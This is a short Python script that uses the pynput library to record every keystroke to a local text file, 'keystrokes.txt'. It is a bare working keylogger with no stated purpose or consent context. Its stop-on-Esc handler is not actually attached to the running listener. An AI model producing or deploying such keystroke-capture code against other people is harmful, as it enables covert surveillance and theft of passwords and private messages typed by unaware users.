from pynput import keyboard

def on_press(key):
    try:
        with open('keystrokes.txt', 'a', encoding='utf-8') as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            elif hasattr(key, 'value'):
                f.write(str(key))
            f.flush()
    except Exception as e:
        print(e)

def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
# with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
# listener = keyboard.Listener(
#     on_press=on_press,
#     on_release=on_release)
# listener.start()